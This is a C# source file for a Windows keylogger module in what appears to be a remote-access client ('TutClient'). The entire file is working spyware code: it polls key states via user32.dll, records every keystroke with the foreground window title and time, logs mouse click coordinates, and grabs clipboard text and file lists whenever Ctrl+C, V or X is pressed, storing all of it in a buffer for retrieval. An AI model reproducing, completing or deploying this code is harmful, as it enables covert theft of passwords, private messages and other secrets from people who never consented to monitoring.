using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace TutClient.Controls
{
    public interface IKeylogger
    {
        void StartLogger();
        void StopLogger();
        string ReadBuffer();
        void Clear();
    }

    /// <summary>
    /// The keylogger module
    /// </summary>
    public class Keylogger : IKeylogger
    {
        /// <summary>
        /// The length of the buffer
        /// </summary>
        private const int N_CHARS = 256;

        /// <summary>
        /// The buffer to save the keys to
        /// </summary>
        private string _keyLog;

        /// <summary>
        /// The title of the last focused window
        /// </summary>
        private string _lastWindow;

        /// <summary>
        /// Killswitch for the keylogger loop
        /// </summary>
        private bool _letRun = true;

        private Dictionary<Keys, string> al = new Dictionary<Keys, string>();
        private Dictionary<Keys, string> sf = new Dictionary<Keys, string>();
        private Dictionary<Keys, string> ag = new Dictionary<Keys, string>();
        private Dictionary<Keys, string> ct = new Dictionary<Keys, string>();
        private bool _setupCompleted = false;

        /// <summary>
        /// True if shift is held, otherwise false
        /// </summary>
        private bool _shiftHeld = false;

        /// <summary>
        /// True if alt+gr is held, otherwise false
        /// </summary>
        private bool _altgrHeld = false;

        /// <summary>
        /// True if control is held, otherwise false
        /// </summary>
        private bool _ctrlHeld = false;

        /// <summary>
        /// Key code for the control key
        /// </summary>
        private int ctrl_key = 0x11;

        /// <summary>
        /// Key code for the alt+gr key
        /// </summary>
        private int altgr_key = 0xA5;

        /// <summary>
        /// Keycode for the shift key
        /// </summary>
        private int shift_key = 0x10;

        #region DLLImports

        /// <summary>
        /// Get the state of a keycode
        /// </summary>
        /// <param name="i">The keycode to check</param>
        /// <returns>The state of the key (pressed or not)</returns>
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        /// <summary>
        /// Get the current focused window's handle
        /// </summary>
        /// <returns>The handle of the focused window</returns>
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        /// <summary>
        /// Get the title text of a window
        /// </summary>
        /// <param name="hWnd">The handle of the window</param>
        /// <param name="text">The buffer to save the text to</param>
        /// <param name="count">The number of chars to read</param>
        /// <returns>The number of chars read</returns>
        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        #endregion

        private Thread _loggerThread = null;

        /// <summary>
        /// Function to start the keylogger
        /// </summary>
        public void StartLogger()
        {
            if(_loggerThread != null)
            {
                // Create Logger thread and start
                _loggerThread = new Thread(Logger);
                _loggerThread.Start();
                _letRun = true;
            }

            if(_loggerThread != null && _letRun == false)
            {
                _letRun = true; // Resume keylogger
            }
        }

        /// <summary>
        /// Function to stop the keylogger
        /// </summary>
        public void StopLogger()
        {
            if(_loggerThread != null && _letRun)
            {
                _letRun = false; // Activate killswitch
            }
        }

        /// <summary>
        /// Read current keylog state
        /// </summary>
        public string ReadBuffer()
        {
            var dump = _keyLog;
            _keyLog = string.Empty;

            return dump;
        }

        public void Clear()
        {
            _lastWindow = string.Empty;
            _keyLog = string.Empty;
        }

        /// <summary>
        /// The logging function
        /// </summary>
        private void Logger()
        {
            if (!_setupCompleted) 
                Setup(); //Do the setup of the key maps

            while (true) //Loop forever
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                if (!_letRun) 
                    continue; //Check the killswitch

                for (var i = 0; i < 255; i++) //Loop through the keycodes
                {
                    var keyState = GetAsyncKeyState(i); //Get the state of the key
                    if (keyState == 1 || keyState == -32767) //Key is pressed / held
                    {
                        _shiftHeld = Convert.ToBoolean(GetAsyncKeyState(shift_key)); //Get the state of shift
                        _altgrHeld = Convert.ToBoolean(GetAsyncKeyState(altgr_key)); //Get the state of alt+gr
                        _ctrlHeld = Convert.ToBoolean(GetAsyncKeyState(ctrl_key)); //Get the state of control
                        
                        var append = GetOverrideKeys(i); //The string to append to the log

                        if(IsCurrentActiveWindowUnchanged() && string.IsNullOrEmpty(append) == false)
                        {
                            _keyLog += append; //Add result to the buffer
                        }
                        else
                        {
                            //Append the new header and the result to the buffer
                            _keyLog += "\n[" + GetActiveWindowTitle() + "  Time: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + "]\n " + append;
                            _lastWindow = GetActiveWindowTitle();
                        }

                        var currentKey = Convert.ToString((Keys)i);
                        currentKey = !Control.IsKeyLocked(Keys.CapsLock) && !_shiftHeld 
                            ? currentKey.ToLower() 
                            : Control.IsKeyLocked(Keys.CapsLock) || _shiftHeld
                                ? currentKey.ToUpper() 
                                : currentKey;
                        
                        if (currentKey.ToLower().Contains("shift") || currentKey.ToLower().Contains("menu") || currentKey.ToLower().Contains("control"))
                        {
                            _keyLog += $"{currentKey}\n";
                        }
                        else
                        {
                            if (sf.ContainsKey((Keys)i) && _shiftHeld)
                            {
                                currentKey = sf[(Keys)i];
                                Console.WriteLine("Shift override applied to text");
                            }
                            if (ag.ContainsKey((Keys)i) && _altgrHeld)
                            {
                                currentKey = ag[(Keys)i];
                                Console.WriteLine("Alt Gr override applied to text");
                            }
                            if (ct.ContainsKey((Keys)i) && _ctrlHeld && !_altgrHeld)
                            {
                                currentKey = ct[(Keys)i];
                                currentKey = UpdateRealTimeData((Keys)i, currentKey);
                                Console.WriteLine("Ctrl override applied to text /normal text/");
                            }

                            _keyLog += currentKey;
                        }

                        break; //Break out of the loop, key found and handled
                    }
                }
            }
        }

        private string GetOverrideKeys(int i)
        {
            var append = string.Empty;

            if (al.ContainsKey((Keys)i)) //Check if default overrides apply to this key
            {
                append = al[(Keys)i]; //Get the override string
                //Console.WriteLine("Updating Append!");
                append = UpdateRealTimeData((Keys)i, append); //Update the changing data labels
                if (sf.ContainsKey((Keys)i) && _shiftHeld) //Check if we need to do shift overrides
                {
                    append = sf[(Keys)i]; //Apply the shift overrides to the key
                    //Console.WriteLine("Shift override applied to text");
                }
                if (ag.ContainsKey((Keys)i) && _altgrHeld) //Check if we need to do altgr overrides
                {
                    append = ag[(Keys)i]; //Apply the altgr override to the key
                    //Console.WriteLine("Alt Gr override applied to text");
                }
                if (ct.ContainsKey((Keys)i) && _ctrlHeld && !_altgrHeld) //Check if we need to do control overrides
                {
                    append = ct[(Keys)i]; //Apply control overrides to the key
                    append = UpdateRealTimeData((Keys)i, append); //Load real time data to the result
                    //Console.WriteLine("Ctrl override applied to text");
                }
            }

            return append;
        }

        private bool IsCurrentActiveWindowUnchanged()
        {
            return _lastWindow == GetActiveWindowTitle();
        }

        /// <summary>
        /// Get a string representation of the current clipboard data
        /// </summary>
        /// <returns>The string representation of clipboard data</returns>
        private string GetClipboard()
        {
            string result = ""; //The result to return
            Thread STAThread = new Thread //Create a new thread
                (
                    delegate () //The function to execute
                    {
                        if (Clipboard.ContainsAudio()) result = "System.IO.Stream [Clipboard Data is Audio Stream]"; //Clipboard is audio data
                        else if (Clipboard.ContainsImage()) result = "System.Drawing.Image [Clipboard data is Image]"; //Clipboard is image data
                        else if (Clipboard.ContainsFileDropList()) //Clipboard is a filed list
                        {
                            System.Collections.Specialized.StringCollection files = Clipboard.GetFileDropList(); //Get the file list
                            result = "System.Collections.Specialized.StringCollection [Clipboard Data is File Drop List]\nFiles:\n"; //Set the header
                            foreach (string file in files) //Go through the stored files
                            {
                                result += file + "\n"; //Append the path of the file
                            }
                        }
                        else if (Clipboard.ContainsText()) result = "System.String [Clipboard Data is Text]\nText:\n" + Clipboard.GetText(); //Clipboard is text
                        else result = "Clipboard Data Not Retrived!\nPerhaps no data was selected when ctrl+c was pressed :("; //No clibpoard data
                        /*IDataObject obj = Clipboard.GetDataObject(); //Get the data object of the clipboard
                        string text = obj.GetData(DataFormats.Text).ToString(); //Get the text data in the clipboard*/
                        //Console.WriteLine("Clipboard function done :)");

                        //Console.WriteLine("data clipboard: " + Clipboard.GetData("%s").ToString());
                    }
                );
            STAThread.SetApartmentState(ApartmentState.STA); //Create a new STA thread
            STAThread.Start(); //Start the thread
            STAThread.Join(); //Join the thread (block execution)
            return result; //Return the result of the thread
        }

        /// <summary>
        /// Update changing data in key definitions
        /// </summary>
        /// <param name="currentKey">The pressed key</param>
        /// <param name="inputValue">The input value to update the old with</param>
        /// <returns>The new string data to append to the log</returns>
        private string UpdateRealTimeData(Keys currentKey, string inputValue)
        {
            var newData = ""; //The data to return

            if (currentKey == Keys.NumLock || currentKey == Keys.CapsLock || currentKey == Keys.Scroll) //*lock handler
            {
                Thread.Sleep(100); //Wait for the key to take effect on the machine
                var state = (Control.IsKeyLocked(currentKey)) ? "Enabled" : "Disabled"; //Get the state of the *lock key
                newData = inputValue.Replace("<rtd.state>", state); //Replace the data label
            }
            else if (currentKey == Keys.LButton || currentKey == Keys.RButton) //Mouse click handler (left & right)
            {
                var posx = Cursor.Position.X.ToString(); //Get the X position of the mouse
                var posy = Cursor.Position.Y.ToString(); //Get the Y position of the mouse
                newData = inputValue.Replace("<rtd.xpos>", posx); //Replace the X position label
                newData = newData.Replace("<rtd.ypos>", posy); //Replace the Y position label
            }
            else if ((currentKey == Keys.X || currentKey == Keys.V || currentKey == Keys.C) && _ctrlHeld) //CTRL + C, V or X (added & ctrlHeld, should be OK)
            {
                Thread.Sleep(100); //Wait for the key to take effect
                newData = inputValue.Replace("<rtd.clipboard>", GetClipboard()); //Get the clipboard data
            }
            else //No override found
            {
                return inputValue; //Return the original value
            }

            return newData; //Return the modified result
        }

        /// <summary>
        /// Setup the key mapping to keycodes
        /// </summary>
        private void Setup()
        {
            //Shift, Alt Gr, Control, Default Modifiers may be different per locales/countries :(
            //al.Add is for keys without modifiers(ex. no shift or alt gr or control is held while the keys was pressed)
            //sf.Add is for keys when the SHIFT modifier is held while the key was pressed
            //ag.Add is for keys when the ALT GR modifier is held while the key was pressed
            //ct.Add is for keys when the CTRL modifiers is held while the key was pressed

            al.Add(Keys.Enter, "\n");
            al.Add(Keys.Space, " ");
            al.Add(Keys.NumPad0, "0");
            sf.Add(Keys.NumPad0, " [INSERT] ");
            al.Add(Keys.NumPad1, "1");
            sf.Add(Keys.NumPad1, " [END] ");
            al.Add(Keys.NumPad2, "2");
            sf.Add(Keys.NumPad2, " [ARROW, DOWN] ");
            al.Add(Keys.NumPad3, "3");
            sf.Add(Keys.NumPad3, " [PAGE, DOWN] ");
            al.Add(Keys.NumPad4, "4");
            sf.Add(Keys.NumPad4, " [ARROW, LEFT] ");
            al.Add(Keys.NumPad5, "5");
            al.Add(Keys.NumPad6, "6");
            sf.Add(Keys.NumPad6, " [ARROW, RIGHT] ");
            al.Add(Keys.NumPad7, "7");
            sf.Add(Keys.NumPad7, " [HOME] ");
            al.Add(Keys.NumPad8, "8");
            sf.Add(Keys.NumPad8, " [ARROW, UP] ");
            al.Add(Keys.NumPad9, "9");
            sf.Add(Keys.NumPad9, " [PAGE, UP] ");
            al.Add(Keys.Add, "+");
            al.Add(Keys.Back, " [BACKSPACE] ");
            al.Add(Keys.CapsLock, " [CapsLock, state: " + "<rtd.state>" + "] ");
            al.Add(Keys.D0, "0");
            sf.Add(Keys.D0, "§");
            al.Add(Keys.D1, "1");
            sf.Add(Keys.D1, "'");
            al.Add(Keys.D2, "2");
            sf.Add(Keys.D2, "\"");
            al.Add(Keys.D3, "3");
            sf.Add(Keys.D3, "+");
            al.Add(Keys.D4, "4");
            sf.Add(Keys.D4, "!");
            al.Add(Keys.D5, "5");
            sf.Add(Keys.D5, "%");
            al.Add(Keys.D6, "6");
            sf.Add(Keys.D6, "/");
            al.Add(Keys.D7, "7");
            sf.Add(Keys.D7, "=");
            al.Add(Keys.D8, "8");
            sf.Add(Keys.D8, "(");
            al.Add(Keys.D9, "9");
            sf.Add(Keys.D9, ")");
            al.Add(Keys.Delete, " [DEL] ");
            al.Add(Keys.Divide, "÷");
            al.Add(Keys.Down, " [ARROW, DOWN] ");
            al.Add(Keys.End, " [END] ");
            al.Add(Keys.Escape, " [ESC] ");
            al.Add(Keys.Home, " [HOME] ");
            al.Add(Keys.Insert, " [INSERT] ");
            al.Add(Keys.LButton, " [Left Click, Position: x=" + "<rtd.xpos>" + "; y=" + "<rtd.ypos>" + "] ");
            al.Add(Keys.Left, " [ARROW, LEFT] ");
            al.Add(Keys.LWin, " [LEFT WINDOWS] ");
            al.Add(Keys.Multiply, "×");
            al.Add(Keys.Oemcomma, ",");
            sf.Add(Keys.Oemcomma, "?");
            ag.Add(Keys.Oemcomma, ";");
            al.Add(Keys.OemMinus, "-");
            sf.Add(Keys.OemMinus, "_");
            ag.Add(Keys.OemMinus, "*");
            al.Add(Keys.OemPeriod, ".");
            sf.Add(Keys.OemPeriod, ":");
            ag.Add(Keys.OemPeriod, ">");
            al.Add(Keys.PageDown, " [PAGE, DOWN] ");
            al.Add(Keys.PageUp, " [PAGE, UP] ");
            al.Add(Keys.PrintScreen, " [PRINT SCREEN] ");
            al.Add(Keys.RButton, " [Right Click, Position: x = " + "<rtd.xpos>" + "; y = " + "<rtd.ypos>" + "] ");
            al.Add(Keys.Right, " [ARROW, RIGHT] ");
            al.Add(Keys.RWin, " [RIGHT WINDOWS] ");
            al.Add(Keys.Scroll, " [Scroll Lock, state: " + "<rtd.state>" + "] ");
            al.Add(Keys.Subtract, "-");
            al.Add(Keys.Tab, " [TAB] ");
            al.Add(Keys.Up, " [ARROW, UP] ");
            al.Add(Keys.NumLock, " [Num Lock, state: " + "<rtd.state>" + "] ");

            //ALT GR Keys different per country (more countries may be supported by default in a newer version)
            ag.Add(Keys.S, "đ");
            ag.Add(Keys.F, "[");
            ag.Add(Keys.G, "]");
            ag.Add(Keys.K, "ł");
            ag.Add(Keys.L, "Ł");
            ag.Add(Keys.Y, ">");
            ag.Add(Keys.X, "#");
            ag.Add(Keys.C, "&");
            ag.Add(Keys.V, "@");
            ag.Add(Keys.B, "{");
            ag.Add(Keys.N, "}");
            ag.Add(Keys.Q, "\\");
            ag.Add(Keys.W, "|");
            ag.Add(Keys.U, "€");
            ag.Add(Keys.D1, "~");
            ag.Add(Keys.D2, "ˇ");
            ag.Add(Keys.D3, "^");
            ag.Add(Keys.D4, "˘");
            ag.Add(Keys.D5, "°");
            ag.Add(Keys.D6, "˛");
            ag.Add(Keys.D7, "`");
            ag.Add(Keys.D8, "˙");
            ag.Add(Keys.D9, "´");

            //CTRL Key Overrides (mostly good for any country)

            ct.Add(Keys.C, " [Control+C, clipboard: <rtd.clipboard>] ");
            ct.Add(Keys.V, " [Control+V, clipboard: <rtd.clipboard>] ");
            ct.Add(Keys.Z, " [Control+Z, Undo] ");
            ct.Add(Keys.F, " [Control+F, Search] ");
            ct.Add(Keys.X, " [Control+X, clipboard: <rtd.clipboard>] ");

            //Country Specific overrides (comment these if your keyboard is not like this)

            //Most likely you will NEED to overwirte this
            //if your keyboard is different than this!
            //More countries may be supported by default in a newer version

            al.Add(Keys.Oemtilde, "ö");
            sf.Add(Keys.Oemtilde, "Ö");
            ag.Add(Keys.Oemtilde, "˝");
            al.Add(Keys.OemQuestion, "ü");
            sf.Add(Keys.OemQuestion, "Ü");
            ag.Add(Keys.OemQuestion, "¨");
            al.Add(Keys.Oemplus, "ó");
            sf.Add(Keys.Oemplus, "Ó");
            al.Add(Keys.OemOpenBrackets, "ő");
            sf.Add(Keys.OemOpenBrackets, "Ő");
            ag.Add(Keys.OemOpenBrackets, "÷");
            al.Add(Keys.Oem6, "ú");
            sf.Add(Keys.Oem6, "Ú");
            ag.Add(Keys.Oem6, "×");
            al.Add(Keys.Oem1, "é");
            sf.Add(Keys.Oem1, "É");
            ag.Add(Keys.Oem1, "$");
            al.Add(Keys.OemQuotes, "á");
            sf.Add(Keys.OemQuotes, "Á");
            ag.Add(Keys.OemQuotes, "ß");
            al.Add(Keys.OemPipe, "ű");
            sf.Add(Keys.OemPipe, "Ű");
            ag.Add(Keys.OemPipe, "¤");
            al.Add(Keys.OemBackslash, "í");
            sf.Add(Keys.OemBackslash, "Í");
            ag.Add(Keys.OemBackslash, "<");

            _setupCompleted = true; //Set the flag
        }

        /// <summary>
        /// Get the title of the focused window
        /// </summary>
        /// <returns>The title of the focused window</returns>
        private string GetActiveWindowTitle()
        {
            var buff = new StringBuilder(N_CHARS); //The buffer to store the title in
            var handle = GetForegroundWindow(); //Get the handle of the focused window

            return GetWindowText(handle, buff, N_CHARS) > 0 ? buff.ToString() : null;
        }
    }
}
